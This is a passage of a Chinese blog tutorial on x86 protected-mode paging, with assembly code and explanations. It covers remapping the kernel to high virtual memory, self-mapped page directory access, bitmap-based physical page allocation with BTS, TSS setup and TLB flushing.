<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/3ad1df59914bba12be726e1ae66c5926-166833015581847.png" class="">
<p>内核映射到虚拟地址高端之后的内存布局。内核是位于虚拟内存，现在只是让段部件发出的地址位于虚拟地址的高端。</p>
<h2 id="13-在分页机制下访问页目录表自身"><a href="#13-在分页机制下访问页目录表自身" class="headerlink" title="13. 在分页机制下访问页目录表自身"></a>13. 在分页机制下访问页目录表自身</h2><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/9fc5d96dbc0a1504600ba8e77bb2b9b7-166833015581848.png" class="">
<p>上图，现在需要在页目录中添加一个表项，使其指向内核原先的位置</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/b6c561c38b70ea1b53dae22737bdfce1-166833015581849.png" class="">

<ul>
<li>页部件从<strong>CR3</strong>寄存器取出页部件的物理基地址，定位到页目录表</li>
<li>段部件发出的地址是<strong>0xFFFFF800</strong></li>
<li>取出<strong>高10位</strong>乘以4，作为页目录表内偏移，从页目录表中取出页表的物理地址，此时发现通过页目录表找到的页表仍然是页目录表自身的基址，即把页目录表当成页表使用</li>
<li>接着从线性地址<strong>中间10位</strong>取出页表内的偏移，取出页的物理基地址</li>
<li>再加上线性地址的<strong>低12位</strong>构成物理地址，去访问内存</li>
<li>将其设置为原先的值，这就将内核从虚拟内存的低端映射到了高端</li>
</ul>
<p>代码如下：</p>
<pre><code class="assembly">    ;在页目录内创建与线性地址0x80000000对应的目录项
    ;mov ebx,0xfffff000                 ;页目录自己的线性地址
    ;mov esi,0x80000000                 ;映射的起始地址
    ;shr esi,22                         ;线性地址的高10位是目录索引
    ;shl esi,2
    ;mov dword [es:ebx+esi],0x00021003  ;写入目录项（页表的物理地址和属性）
                             			;目标单元的线性地址为0xFFFFF200
    mov dword [es:0xfffff800], 0x00021003
</code></pre>
<h2 id="14-使内核在虚拟内存高端的映射生效"><a href="#14-使内核在虚拟内存高端的映射生效" class="headerlink" title="14. 使内核在虚拟内存高端的映射生效"></a>14. 使内核在虚拟内存高端的映射生效</h2><p>修改与内核有关的段描述符，以及<strong>GDT</strong>自己的线性地址</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/91a65c1fdf8d13e23c1bd7ec0059820a-166833015581850.png" class="">
<p>只需要修改内核所有段描述符的最高位，将其<strong>置1</strong>即可（等于加上0x80000000)，代码如下：</p>
<pre><code class="assembly">    ;将GDT中的段描述符映射到线性地址0x80000000
    sgdt [pgdt]
    
    mov ebx,[pgdt+2]
    
    or dword [es:ebx+0x10+4],0x80000000;处理保护模式下初始代码段描述符
    or dword [es:ebx+0x18+4],0x80000000;处理内核的栈段描述符
    or dword [es:ebx+0x20+4],0x80000000;处理显示缓冲区描述符
    or dword [es:ebx+0x28+4],0x80000000;处理公共例程段描述符
    or dword [es:ebx+0x30+4],0x80000000;处理内核数据段描述符
    or dword [es:ebx+0x38+4],0x80000000;处理内核代码段描述符
    
    add dword [pgdt+2],0x80000000      ;GDTR也用的是线性地址
    
    lgdt [pgdt]							;使得修改生效
</code></pre>
<p>修改中断描述符表<strong>IDTR</strong>，因为中断描述符表已经被映射到虚拟内存的高端</p>
<pre><code class="assembly">    ;修改IDTR，将中断描述符表映射到线性地址高端
    sidt [pidt]
    add dword [pidt+2],0x80000000      ;IDTR也用的是线性地址
    lidt [pidt]
</code></pre>
<p>段寄存器由段选择器和描述符高速缓存器组成，处理器执行指令时，不会每次都加载段选择器，而是使用段描述符高速缓存器中的基地址访问内存。</p>
<p>所以当修改了<strong>GDT</strong>的基地址或段描述符之后，这些修改不会立即反映到段描述符高速缓存器，对程序的运行没有任何影响。</p>
<p>但是当执行一个段间转移指令、或向段寄存器里加载一个新的段描述符选择子时，处理器会访问<strong>GDT</strong>或<strong>LDT</strong>，将刷新段寄存器的描述神高速缓存器中的内容</p>
<p>因此为了使处理器转移到内存高端执行，需要显示的刷新段寄存器内容，代码段<strong>CS</strong>的刷新需要用转移指令完成：</p>
<pre><code class="assembly">    jmp core_code_seg_sel:flush        ;刷新段寄存器CS，启用高端线性地址
    ;导致处理器使用新的段选择子core_code_seg_sel来访问GDT；
    ;从中取出修改后的代码段描述符，并加载到CS描述符高速缓存器中；
    ;这直接导致处理器从虚拟地址高端取指令执行
    
flush:
    mov eax,core_stack_seg_sel		;刷新SS，同时刷新其描述符高速缓存器
    mov ss,eax						;物理地址没有改变，改变的是线性地址
    
    mov eax,core_data_seg_sel		;刷新DS，同时刷新其描述符高速缓存器
    mov ds,eax						;物理地址没有改变，改变的是线性地址
</code></pre>
<p>即使是在分页机制下，显存的基地址部分加上了<strong>0x80000000</strong>，例程<strong>put_string</strong>和<strong>put_char</strong>也没有做任何修改。</p>
<p>尽管显存基地址已经映射到<strong>0x800B8000</strong>，但是向这个虚拟的地址写数据时，页部件将会把它转换为真实的显存位置<strong>0x000B8000</strong>.</p>
<h2 id="15-为内核任务创建任务控制块TCB"><a href="#15-为内核任务创建任务控制块TCB" class="headerlink" title="15. 为内核任务创建任务控制块TCB"></a>15. 为内核任务创建任务控制块TCB</h2><p>接上一节，为系统服务例程安装门描述符，没有修改，因为门描述符的创建只涉及目标代码段的选择以及例程在段内的偏移量，不受内存映射的影响。</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/08ee83725bed57df523f887bad4feb86-166833015581851.png" class="">
<p>接下来创建内核任务，内核任务有自己的动态空间<strong>TCB</strong>，而且它的空间不是动态分配的，是明确指定的的。由于内核被映射到高端字节，所以内核<strong>TCB</strong>的线性地址也变为<strong>0x8001F800</strong>.代码如下：</p>
<pre><code class="assembly">    ;对门进行测试 
    mov ebx,message_2
    call far [salt_1+256]              ;通过门显示信息(偏移量将被忽略) 
    
    ;开始创建和确立内核任务
    mov ecx,core_lin_tcb_addr          ;移至高端之后的内核任务TCB线性地址
    mov word [es:ecx+0x04],0xffff      ;任务的状态为“忙”
    mov dword [es:ecx+0x46],core_lin_alloc_at
                                     ;登记内核中可用于分配的起始线性地址
    call append_to_tcb_link            ;将内核任务的TCB添加到TCB链中
    
    mov esi,ecx
</code></pre>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/a3b525b67a8d9b517437736e9ae5353f-166833015581852.png" class="">
<p>若之前分配过地址，在虚拟地址的低端<strong>1MB</strong>，之后就是建立虚拟地址和物理地址的映射；若要再分配内存，那就需要从<strong>0x100000</strong>开始分配，需要将上一个<strong>TCB</strong>的尾部结构修改为这次分配的地址起始位置，即<strong>0x100000</strong>。</p>
<h2 id="16-为内核任务的TSS分配内存空间"><a href="#16-为内核任务的TSS分配内存空间" class="headerlink" title="16. 为内核任务的TSS分配内存空间"></a>16. 为内核任务的TSS分配内存空间</h2><pre><code class="assembly">    ;为内核任务的TSS分配内存空间。所有TSS必须创建在内核空间
    mov ecx,104                        ;为该任务的TSS分配内存
    call sys_routine_seg_sel:allocate_memory	;创建TSS所需内存是动态分配的
                                                ;必须在内核的虚拟地址空间中
    mov [es:esi+0x14],ecx              ;在内核TCB中保存TSS基地址
</code></pre>
<p>例程<strong>allocate_memory</strong>：</p>
<pre><code class="assembly">allocate_memory:			;在当前任务的地址空间中分配内存
                     	 	;输入：ECX=希望分配的字节数
                      		;输出：ECX=起始线性地址 
    push eax
    push ebx
    
    push ds
    
    ;得到TCB链表首节点的线性地址
    ;因为是在当前任务的虚拟线性空间中分配，所以需要搜索TCB链表
    ;找到当前TCB，从中取得可用于分配的线性地址，从这个地址处开始分配
    mov eax,core_data_seg_sel
    mov ds,eax
    
    mov eax,[tcb_chain]                ;EAX=首节点的线性地址
    
    mov ebx,mem_0_4_gb_seg_sel
    mov ds,ebx
    
    ;搜索状态为忙（当前任务）的节点
.s0:
    cmp word [eax+0x04],0xffff
    jz .s1				;找到忙的节点，EAX=节点的线性地址
    mov eax,[eax]
    jmp .s0
    
    ;开始分配内存
.s1:
    mov ebx,eax			;找到忙的节点，EAX=节点的线性地址
    call sys_routine_seg_sel:task_alloc_memory
    
    pop ds
    
    pop ebx
    pop eax
    
    retf
</code></pre>
<p>其中例程<strong>task_alloc_memory</strong>：</p>
<pre><code class="assembly">task_alloc_memory:		;在指定任务的虚拟内存空间中分配内存
                        ;并不一定是在当前任务的虚拟内存空间中分配
          				;输入：EBX=任务控制块TCB的线性地址
          				;      ECX=希望分配的字节数
          				;输出：ECX=已分配的起始线性地址
    push eax
    
    push ds
    
    push ebx                           ;to A
    
    ;获得本次内存分配的起始线性地址
    mov ax,mem_0_4_gb_seg_sel
    mov ds,ax
    
    mov ebx,[ebx+0x46]                 ;获得本次分配的起始线性地址
    mov eax,ebx
    add ecx,ebx                        ;本次分配，最后一个字节之后的线性地址
    
    push ecx                           	;To B
                                        ;下一次可以分配的线性地址，需要压栈保护
    ;为请求的内存分配页
    and ebx,0xfffff000		;线性地址低12位没有用，将其清零
    and ecx,0xfffff000
.next:
    call sys_routine_seg_sel:alloc_inst_a_page
          								;安装当前线性地址所在的页
    add ebx,0x1000                     	;+4096
    cmp ebx,ecx
    jle .next
    
    ;将用于下一次分配的线性地址强制按4字节对齐
    pop ecx                            	;B
                                        ;原先保存下一次内存分配可以使用的起始线性地址
                                        ;弹出之后要保存到TCB中，这里要先对齐
    test ecx,0x00000003                ;线性地址是4字节对齐的吗？
    jz .algn                           ;是，直接返回
    add ecx,4                          ;否，强制按4字节对齐
    and ecx,0xfffffffc
    
.algn:
    pop ebx                            ;A
    
    mov [ebx+0x46],ecx                 ;将下次分配可用的线性地址回存到TCB中
    mov ecx,eax
    
    pop ds
    
    pop eax
    
    retf
</code></pre>
<h2 id="17-处理与线性地址对应的页目录项和页表项"><a href="#17-处理与线性地址对应的页目录项和页表项" class="headerlink" title="17. 处理与线性地址对应的页目录项和页表项"></a>17. 处理与线性地址对应的页目录项和页表项</h2><p>接上一节，知道本次内存分配涉及哪些线性地址，这是一个连续的线性地址范围区间，通过循环反复调用<strong>alloc_inst_a_page</strong>来安装与这些线性地址对应的物理页。</p>
<p>其中例程<strong>task_alloc_memory</strong>：</p>
<pre><code class="assembly">task_alloc_memory:
。。。
    ;为请求的内存分配页
    and ebx,0xfffff000		;线性地址低12位没有用，将其清零
    and ecx,0xfffff000
.next:
    call sys_routine_seg_sel:alloc_inst_a_page
          								;安装当前线性地址所在的页
    add ebx,0x1000                     	;+4096
    cmp ebx,ecx
    jle .next
</code></pre>
<p>其中例程<strong>alloc_inst_a_page</strong>用来为指定的线性地址分配一个物理页</p>
<pre><code class="assembly">    alloc_inst_a_page:	;分配一个页，并安装在当前活动的
                        ;层级分页结构中
                        ;输入：EBX=页的线性地址
    push eax
    push ebx
    push ecx
    push esi
    push ds
    
    mov eax,mem_0_4_gb_seg_sel
    mov ds,eax		;后面用线性地址访问页目录表和页表自身做准备
    
    ;线性地址的高10位是页目录表索引
    ;用它来检查该线性地址所对应的页表是否存在
    mov esi,ebx
    and esi,0xffc00000                 ;清除页表索引和页内偏移部分
    shr esi,20                         ;将页目录索引乘以4作为页内偏移
    or esi,0xfffff000                  ;页目录自身的线性地址+表内偏移
    
    test dword [esi],0x00000001        ;P位是否为“1”。检查该线性地址是
    jnz .b1                            ;否已经有对应的页表
    
    ;页目录项不存在，就创建一个新的页表，并将页表的地址写入这个页目录项
    ;创建并安装该线性地址所对应的页表
    call allocate_a_4k_page		;分配一个页做为页表
                                ;这个物理地址只保留前20位
                                ;后12位是页的属性值，为0x07
    or eax,0x00000007			;US位是1，即特权级3也可以访问
                                ;现在是在为内核人物的TSS分配内存
                                ;TSS只能由特权级0的内核任务访问，其所在的页也只能有
                                ;特权级0的内核任务访问，但是这里为什么允许特权级3的内存访问呢？
                                ;
                                ;原则上是不允许的，但是这个例程是通用的，3特权级要求US位是1，
                                ;0特权级要求US位是0，
                                ;为了省事就把US位置1了
    mov [esi],eax               ;在页目录中登记该页表,将页目录项的内容修改为页表的物理地址
    
    ;清空当前页表，把页表当成普通的页来用
    mov eax,ebx
    and eax,0xffc00000	;清空低22位
    shr eax,10			;右移10次
    or eax,0xffc00000	;将高10位设置成0x3FF
    mov ecx,1024		;之后用循环访问页表内的全部页表项
.cls0:
    mov dword [es:eax],0x00000000
    add eax,4			;加4得到下一个页表项
    loop .cls0
    
.b1:
    ;检查该线性地址对应的页表项（页）是否存在
    mov esi,ebx
    and esi,0xfffff000                 ;清除页内偏移部分
    shr esi,10                         ;将页目录索引变成页表索引，页表索引乘以4作为页内偏移
    or esi,0xffc00000                  ;得到该线性地址对应的页表项
    
    test dword [esi],0x00000001        ;P位是否为“1”。检查该线性地址是
    jnz .b2                            ;否已经有对应的页
    
    ;创建并安装该线性地址所对应的页
    call allocate_a_4k_page            ;分配一个页，这才是要安装的页
    or eax,0x00000007
    mov [esi],eax
    
.b2:
    pop ds
    pop esi
    pop ecx
    pop ebx
    pop eax
    
    retf
</code></pre>
<p>其中把页目录表当成页表使用：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/7b5c22e8ad8cf86185d4ec963a28e64a-166833015581853.png" class="">
<p>即页目录表的高10位右移到最右端，再左移两位补0，其余补1.这个线性地址就可以把页目录表当成一个页来用，即访问页目录表自身。</p>
<p>其中把页表当成普通的页来用：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/272b36f0833457b2c03537b9216d8e1f-166833015581854.png" class="">


<h2 id="18-根据需要分配物理页并设置页表项"><a href="#18-根据需要分配物理页并设置页表项" class="headerlink" title="18. 根据需要分配物理页并设置页表项"></a>18. 根据需要分配物理页并设置页表项</h2><p>接上一节，其中例程<strong>alloc_inst_a_page</strong>：用来为指定的线性地址分配一个物理页</p>
<pre><code class="assembly">alloc_inst_a_page:

    ......
    
      .b1:
         ;检查该线性地址对应的页表项（页）是否存在
         mov esi,ebx
         and esi,0xfffff000                 ;清除页内偏移部分
         shr esi,10                         ;将页目录索引变成页表索引，页表索引乘以4作为页内偏移
         or esi,0xffc00000                  ;得到该线性地址对应的页表项

         test dword [esi],0x00000001        ;P位是否为“1”。检查该线性地址是
         jnz .b2                            ;否已经有对应的页

         ;创建并安装该线性地址所对应的页
         call allocate_a_4k_page            ;分配一个页，这才是要安装的页
         or eax,0x00000007
         mov [esi],eax

  .b2:
         pop ds
         pop esi
         pop ecx
         pop ebx
         pop eax

         retf
                 
</code></pre>
<p>要想判断与线性地址对应的页表项是否有效，需要访问页表自身，将页表当成一个普通的页来访问。</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/a05d401b9a96a903b54d20c9fb3d038a-166833015581855.png" class="">
<p>此时图中第三行的线性地址就是我们要访问的那个页表项的线性地址</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/0fd5c986eb285833f1dfcfffe044b0ac-166833015581856.png" class="">
<p>如上图，访问过程。</p>
<h2 id="19-物理内存的页面管理和页映射位串"><a href="#19-物理内存的页面管理和页映射位串" class="headerlink" title="19. 物理内存的页面管理和页映射位串"></a>19. 物理内存的页面管理和页映射位串</h2><p>无论分配页表还是物理页，都要调用例程<strong>allocate_a_4k_page</strong>，这个例程用来分配物理页，对于每个任务来说内存分配包括两个互相连续的部分：首先是在任务自己的虚拟内存空间中分配，然后将其映射到物理内存中的页。</p>
<p>物理页的数量是有限的，是所有任务共享的，若物理页空间不足，还需要执行内存换入换出操作。操作系统需要在上电之后就检测实际的物理内存数量，并建立一张表格登记每个页的基本信息，包括页的物理地址以及是否空闲。<strong>4GB</strong>共可分配<mark>1048576</mark>个页，为了简单起见，使用位串指定页的位置和分配情况。</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/e66f60ea08bb0e11cc9de0dd2e497b7a-166833015581857.png" class="">
<p>比特的位置决定页的位置，比特位的值决定了页的分配情况，<strong>0</strong>表示此页空闲、<strong>1</strong>表示此页被占用。</p>
<p>在本章中没有检测实际内存的代码，仅仅假定我们只有<strong>2MB</strong>的物理内存空间可用，<strong>2MB = 512KB</strong>，需要<strong>512</strong>个位串，使用连续的字数据来声明位串，在内核数据段中：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/13f99b6ba093a2a18cba25f1489a24ab-166833015581858.png" class="">
<p>第一个字节<strong>0xff</strong>的<strong>位0</strong>对应<strong>物理地址为0</strong>的页，<strong>位1</strong>对应<strong>物理地址为0x1000</strong>的页；<br>第二个字节<strong>0xff</strong>的位0对应物理地址为<strong>0x8000</strong>的页，位1对应物理地址为<strong>0x9000</strong>的页；<br>把比特在比特串中的序号乘以<strong>0x1000</strong>就得到其所对应的物理页的地址（0x1000递增）。<br>前32字节对应内存最低端<strong>1MB</strong>中的页，共256个页。这一部分已经整体划归内核使用，没有被内核占用的部分也大多被外围硬件占用，包括ROM-BIOS。</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/6a69e2857945ee2dba5b35e8cc22619f-166833015581859.png" class="">
<p>其中前32个字节中有两个<strong>0x55</strong>，对应<strong>48~63</strong>，16进制是<strong>0x30~0x3F</strong>，乘以<strong>0x1000</strong>之后对应物理页范围是<strong>0x30000~0x3F000</strong>共<strong>64KB</strong>，可以划分为16个页。为了表明页的分配是随机的，即连续的线性地址空间不必对应连续的页，有意将页在物理上分开，<strong>0x55 = 01010101</strong>，表示空闲页和已经分配的页是交替出现的。</p>
<p>但是将<strong>0x55</strong>对应的<strong>16个页</strong>作为空闲页分配未必合理，因为低端1MB内存已经分配给内核，在内核的页表中，已经有页表项指向这16个页，若在将其分配给其他任务，那么其他任务的页表项有势必指向这16个页，即重复分配。但是线性地址到物理页的映射可以是重复的，内核也不会使用这16个页，分配给其他任务也无妨。</p>
<h2 id="20-空闲页的搜索和BTS指令"><a href="#20-空闲页的搜索和BTS指令" class="headerlink" title="20. 空闲页的搜索和BTS指令"></a>20. 空闲页的搜索和BTS指令</h2><p>接上一节，查看例程<strong>allocate_a_4k_page</strong>：</p>
<pre><code class="assembly">    allocate_a_4k_page:			;分配一个4KB的页
                                ;输入：无
                                ;输出：EAX=页的物理地址
                                ;每个页的状态可以从页映射位串中获得
    push ebx
    push ecx
    push edx
    push ds
    
    mov eax,core_data_seg_sel
    mov ds,eax		;指向内核数据段，以便指向页映射位串
    
    xor eax,eax		;循环，从头开始搜索位串，查找空闲的页
                    ;从页映射位串中找到第一个为0的比特
                    ;记下在整个位串中的位置
.b1:
    bts [page_bit_map],eax	;搜索位串，寻找第一个为0的比特
    jnc .b2
    inc eax
    cmp eax,page_map_len*8
    jl .b1
    
    mov ebx,message_3
    call sys_routine_seg_sel:put_string
    hlt					;没有可以分配的页，停机
    
.b2:
    shl eax,12			;乘以4096（0x1000）
    
    pop ds
    pop edx
    pop ecx
    pop ebx
    
    ret
</code></pre>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/656dfa078ff57ba75bd187ffe33d9b41-166833015581860.png" class="">

<ul>
<li>测试位串中的某个比特，用该比特的值设置标志寄存器的进位标志<strong>CF</strong>，然后将位串中的比特置1</li>
<li>目的操作数：<strong>16、32、64</strong>位的通用寄存器，或者是用于指定位串起始位置的内存地址，若是寄存器，则指定的位串就是该寄存器的内容</li>
<li>源操作数：<strong>16、32、64</strong>位的通用寄存器，用于指定待测试比特在位串中的位置，索引</li>
<li>目的操作数和源操作数若都为通用寄存器，则长度必须是一致的</li>
</ul>
<p>目的操作数是通用寄存器：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/3dcec8f0d43ee50f8db16c63509ea2dc-166833015581861.png" class="">
<p><strong>EDX</strong>是<font color="red">待测试位串</font>，<strong>ECX</strong>包含那个待测试比特的索引。如果目的操作数是寄存器，<mark>则根据目的操作数的长度，处理器先求得源操作数除以<strong>16、32、64</strong>的余数，并将其作为待测试比特的索引<mark>，然后从<font color="red">待测试位串</font>中取得该比特，并传送到标志寄存器的<strong>CF</strong>位，最后将该比特<strong>置1</strong>。<br><mark>在这里就是将ecx除以32取余，将余数作为索引在edx中找到对应的比特位查看是0还是1，并将其写入EFLAGS的CF位，然后不管是0还是1都要将在edx中找到的对应比特位置1<mark>。</mark></mark></mark></mark></p>
<p>目的操作数是内存地址：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/194209671b306b8380b601d6be27d590-166833015581862.png" class="">
<p>目的操作数给出的是该位串在在内存中的第一个字节的地址，源操作数指定了可以访问的串的最大长度，若源操作数是16位的，则目的操作数即位串最大可以达到<strong>2^16</strong>个比特。</p>
<h2 id="21-空闲页搜索和分配的具体过程"><a href="#21-空闲页搜索和分配的具体过程" class="headerlink" title="21. 空闲页搜索和分配的具体过程"></a>21. 空闲页搜索和分配的具体过程</h2><p>接上一节，查看例程<strong>allocate_a_4k_page</strong>：</p>
<pre><code class="assembly">SECTION core_data vstart=0                  ;系统核心的数据段

    ......
    ......
    
    page_bit_map    db  0xff,0xff,0xff,0xff,0xff,0xff,0x55,0x55
                    db  0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff
                    db  0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff
                    db  0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff
                    db  0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55
                    db  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                    db  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                    db  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
    page_map_len	equ		$-page_bit_map

    ......
    ......
    ......

    allocate_a_4k_page:			;分配一个4KB的页
                                ;输入：无
                                ;输出：EAX=页的物理地址
                                ;每个页的状态可以从页映射位串中获得
    push ebx
    push ecx
    push edx
    push ds
    
    mov eax,core_data_seg_sel
    mov ds,eax		;指向内核数据段，以便指向页映射位串
    
    xor eax,eax		;循环，从头开始搜索位串，查找空闲的页
                    ;从页映射位串中找到第一个为0的比特
                    ;记下在整个位串中的位置
.b1:
    bts [page_bit_map],eax	;搜索位串，寻找第一个为0的比特
                            ;每次搜索的比特位的值都会传送到CF位
                            ;并且位串中的这个比特位被置1
    jnc .b2		;若CF=0，表示找到了空闲的页面，转到 .b2处执行，
                ;若CF=1，表示当前比特对应的页面被分配过了，还得继续查找。
    inc eax
    cmp eax,page_map_len*8		;page_map_len是位串的字节长度
                                ;乘以8换算成二进制比特位的数量
    jl .b1		;若没有超过，小于关系成立，转移到标号 .b1 处重新查找空闲页
                ;若超过了位串最大长度，小于关系不成立，打印文本，停机
    mov ebx,message_3
    call sys_routine_seg_sel:put_string
    hlt					;没有可以分配的页，停机
    
.b2:					;一旦找到空闲页，到达此处
                        ;EAX保存代表空闲页的那个比特位的索引号
                        ;将这个索引号乘以0x1000、4096就得到所应对的那个页的物理地址
    shl eax,12			;乘以4096（0x1000）
    
    pop ds
    pop edx
    pop ecx
    pop ebx
    
    ret
</code></pre>
<p>内存分配的全过程：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/5837f70290e6bb72a757e1bcef580a32-166833015581863.png" class="">


<h2 id="22-确立内核任务并开始创建用户任务"><a href="#22-确立内核任务并开始创建用户任务" class="headerlink" title="22. 确立内核任务并开始创建用户任务"></a>22. 确立内核任务并开始创建用户任务</h2><p>接上一节，回到内核<strong>start</strong>流程中<br>在<strong>TSS</strong>中登记必要项：</p>
<pre><code class="assembly">         ;在程序管理器的TSS中设置必要的项目
         mov word [es:ecx+0],0              ;反向链=0
         mov eax,cr3
         mov dword [es:ecx+28],eax          ;登记CR3(PDBR)
         mov word [es:ecx+96],0             ;没有LDT。处理器允许没有LDT的任务。
         mov word [es:ecx+100],0            ;T=0
         mov word [es:ecx+102],103          ;没有I/O位图。0特权级事实上不需要。
                                            ;不需要0、1、2特权级堆栈。0特级不
                                            ;会向低特权级转移控制。 
</code></pre>
<p>其中<strong>TSS</strong>还有其他信息没有填写，这些信息会在处理器进行第一次任务切换时自动填写。<br>接着创建<strong>TSS</strong>描述符、加载当前任务到<strong>TR</strong>寄存器中。<br>接着创建用户任务的<strong>TCB</strong>并加载到<strong>TCB</strong>的链表中、接着使用例程<strong>load_relocate_program</strong>创建用户任务相关内容。</p>
<h2 id="23-用户任务的内存分配策略"><a href="#23-用户任务的内存分配策略" class="headerlink" title="23. 用户任务的内存分配策略"></a>23. 用户任务的内存分配策略</h2><p>创建用户任务的第一步就是分配内存，将用户任务的程序加载进来。</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/aca041c9ac0123cdb24af86c9edcd428-166833015581864.png" class="">
<p>当前正在执行内核的页目录表和页表，也就无法通过用户任务的页目录表和页表来访问内存，也不能切换到用户任务的页目录表和页表，切换之后内核就不能执行下去了。</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/dd2b5a8684bfc62701272aea8478fbf0-166833015581865.png" class="">
<p>先给出内核任务、用户任务如何将虚拟地址空间映射到物理地址空间的：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/6fd5cdbb83920e3cf30528b36302925c-166833015581866.png" class="">
<p>其中内核与内核任务是共享高2GB空间的，所以在所有任务的页目录的高端都是一样的，在内核的页表中，既包含了内核所占用的物理页面，也包含了内核任务私有的物理页面。不过没有关系，因为只有内核任务才会使用页目录表的高2GB的表项，用户任务只会使用页目录低2GB的表项。</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/349244ce1593efe244c1b0adc27561fd-166833015581867.png" class="">
<p>在内核任务的虚拟内存的低2GB是未使用的，那么对应内核任务的页目录中低一半的表项也是未使用的。</p>
<p>那么在创建用户任务时可以先在内核任务的虚拟空间的低一半分配内存，即使用页目录的低一半创建页目录表项，同时也会创建一些与这部分对应的页表并分配物理页。</p>
<p>因为是在创建用户任务，所以还会从硬盘中读出用户任务，写入分配来的这些物理页中。</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/f4f000bbf6183222289074429bf531a0-166833015581868.png" class="">
<p>等这些工作完成之后，将内核任务的页目录表复制一份，作为被创建的用户任务的页目录表。此时用户任务的高一半指向内核的页表，低一半指向刚才创建的用户任务的页表。再复制之后，将内核任务的低一半页目录表清空。</p>
<h2 id="24-清空内核任务页目录表的前半部分并刷新TLB"><a href="#24-清空内核任务页目录表的前半部分并刷新TLB" class="headerlink" title="24. 清空内核任务页目录表的前半部分并刷新TLB"></a>24. 清空内核任务页目录表的前半部分并刷新TLB</h2><p>接上一节，进入例程<strong>load_relocate_program</strong>，加载重定位用户程序，并创建用户任务。本节代码如下：</p>
<pre><code class="assembly">load_relocate_program:                      ;加载并重定位用户程序
                                            ;输入: PUSH 逻辑扇区号
                                            ;      PUSH 任务控制块基地址
                                            ;输出：无 
         pushad
      
         push ds
         push es
      
         mov ebp,esp                        ;为访问通过堆栈传递的参数做准备
      
         mov ecx,mem_0_4_gb_seg_sel
         mov es,ecx

         ;清空当前页目录的前半部分（对应低2GB的局部地址空间）
         mov ebx,0xfffff000
         xor esi,esi
  .clsp:
         mov dword [es:ebx+esi*4],0x00000000
         inc esi
         cmp esi,512
         jl .clsp

         mov ebx,cr3                        ;刷新TLB
         mov cr3,ebx
                                                       
</code></pre>
<p>开启页部件时，页部件使用页目录和页表将线性地址转换为物理地址。而访问页目录表和页表是耗时的，因此把页表项提前存放到处理器中可以加快地址转换的速度，为此在处理器内部特地构造了一个高速缓存装置<strong>（Transaction Lookaside Buffer）</strong>。</p>
